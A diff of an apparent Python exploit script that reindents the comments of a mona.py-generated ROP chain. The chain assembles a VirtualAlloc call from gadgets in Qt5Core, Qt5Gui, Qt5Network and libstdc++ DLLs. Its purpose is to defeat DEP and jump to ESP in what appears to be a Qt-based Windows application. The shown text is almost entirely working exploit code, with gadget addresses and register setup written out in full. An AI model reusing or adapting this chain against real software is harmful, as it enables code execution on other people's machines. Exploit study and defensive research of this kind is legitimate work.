@@ -17,17 +17,17 @@ def create_rop_chain1():
 
     # rop chain generated with mona.py - www.corelan.be
     rop_gadgets = [
-            #ESI - SET  DWORD pointer to vitualalloc in ESI
+      #ESI - SET  DWORD pointer to vitualalloc in ESI
       0x61e93a2c,  # POP ECX # RETN [Qt5Gui.dll] 
       0x690398a0,  # ptr to &VirtualAlloc() [IAT Qt5Core.dll]
       0x6fed7840,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [libstdc++-6.dll] 
       0x68b55c9f,  # XCHG EAX,ESI # RETN [Qt5Core.dll] 
 	  
-	  #EBP - lpAddress (return address)Redirect Execution flow to ESP (n Call to ESP)
+      #EBP - lpAddress (return address)Redirect Execution flow to ESP (n Call to ESP)
       0x61e1a949,  # POP EBP # RETN [Qt5Gui.dll] 
       0x68d652e1,  # & call esp [Qt5Core.dll]
 	  
-	  #EBX - dwSize(0x1)
+      #EBX - dwSize(0x1)
       0x69a87c26,  # POP EDX # RETN [Qt5Network.dll] 
       0xffffffff,  # Value to negate, will become 0x00000001
       0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll] 
@@ -42,21 +42,21 @@ def create_rop_chain1():
       0x69a76004,  # ADD EAX,83038642 # ADD AL,53 # RETN [Qt5Network.dll] 
       0x61f2735a,  # XCHG EAX,EDX # RETN [Qt5Gui.dll] 
 	  
-	  #ECX - flprotect (0x40)
+      #ECX - flprotect (0x40)
       0x61d0cf5f,  # POP EAX # RETN [Qt5Gui.dll] 
       0xffffffc0,  # Value to negate, will become 0x00000040
       0x6feb3a1e,  # NEG EAX # RETN [libstdc++-6.dll] 
       0x68bf90bb,  # XCHG EAX,ECX # RETN [Qt5Core.dll]
 
-   #EDI -  rop nop	  
+      #EDI -  rop nop	  
       0x61ec405a,  # POP EDI # RETN [Qt5Gui.dll] 
       0x6fe4ceac,  # RETN (ROP NOP) [libstdc++-6.dll]
 	  
-	  # EAX - ESP points 4 bytes into buffer - to compensate
+      # EAX - ESP points 4 bytes into buffer - to compensate
       0x61ba8370,  # POP EAX # RETN [Qt5Gui.dll] 
       0x90909090,  # nop
 	  
-	  #push on stack in
+      #push on stack in
       0x68aa7f55,  # PUSHAD # RETN [Qt5Core.dll] 
     ]
     return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
